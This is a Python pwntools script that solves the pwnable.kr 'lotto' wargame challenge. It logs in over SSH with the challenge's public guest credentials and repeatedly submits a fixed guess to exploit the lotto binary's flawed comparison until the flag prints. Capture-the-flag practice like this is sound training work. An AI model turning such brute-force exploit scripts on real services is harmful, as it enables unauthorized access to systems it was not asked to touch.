from pwn import *

BINARY_PATH = '/home/lotto/lotto'

# Each character's ascii must be between 1 - 45
GUESS = b'      '


def main() -> None:
    connection = ssh('lotto', host='pwnable.kr', port=2222, password='guest')
    p = connection.process([BINARY_PATH])

    for i in range(99999999999999):
        p.sendline('1')
        p.sendline(GUESS)
        result = p.recvuntil('bad luck', timeout=3)

        if not result:
            print('Corrent guess!!')
            print(p.recv().decode())


if __name__ == '__main__':
    main()
